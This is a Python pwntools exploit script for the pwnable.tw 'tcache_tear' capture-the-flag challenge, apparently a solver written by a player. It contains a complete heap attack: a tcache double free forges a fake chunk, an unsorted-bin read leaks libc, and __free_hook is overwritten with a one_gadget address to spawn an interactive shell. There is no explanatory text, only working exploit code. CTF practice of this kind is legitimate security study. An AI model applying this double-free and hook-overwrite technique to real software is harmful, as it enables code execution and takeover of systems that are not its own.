#!/usr/bin/env python
from pwn import *
context(log_level='debug',arch='amd64')
p=process('./tcache_tear')#,env={'LD_PRELOAD':'./libc.so'})
# p=remote('chall.pwnable.tw',10207)
libc=ELF('./libc.so')
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def menu(i):
    ru('Your choice :')
    sl(str(i))

def add(Size,payload):
    menu(1)
    ru('Size:')
    sl(str(Size))
    ru('Data:')
    sd(payload)
def delete():
    menu(2)
def info():
    menu(3)


ru('Name:')
sd(p64(0)+p64(0xf1)+p64(0)+p64(0Xf1)+'\n')

add(0xe0,'a\n')
delete()
delete()

add(0xe0,p64(0x602060)+'\n')
add(0xe0,p64(0x602060)+'\n')
add(0xe0,'\n')



add(0,'a\n')
delete()
delete()            # 

add(0,p64(0x602070))
add(0,'a\n')
payload=('\x00'*0x18+p64(0x602070)).ljust(0xe0,'\x00')
payload+=(p64(0)+p64(0x21)).ljust(0x20,'\x00')
payload+=p64(0)+p64(0x21)
add(0,payload)

delete()

info()
ru('Name :')
libc_addr=u64(ru('$$$$$$$$$$$$$$$$$$$$$$$')[16:24])
libc_base=libc_addr-0x3ebca0
print(hex(libc_base))
one_off=0x4f2c5
one_off=0x4f322
# one_off=0x10a38c

stdin=0x3eba00+libc_base
stdout=0x3ec760+libc_base
str_jump=0x3e8360+libc_base

one=one_off+libc_base
libc.address=libc_base
malloc_hook_addr=libc.symbols['__free_hook']

add(0xf0,'a')
delete()
delete()

add(0xf0,p64(malloc_hook_addr))

add(0xf0,p64(0))
add(0xf0,p64(one))
gdb.attach(p)
delete()

# delete()
p.interactive()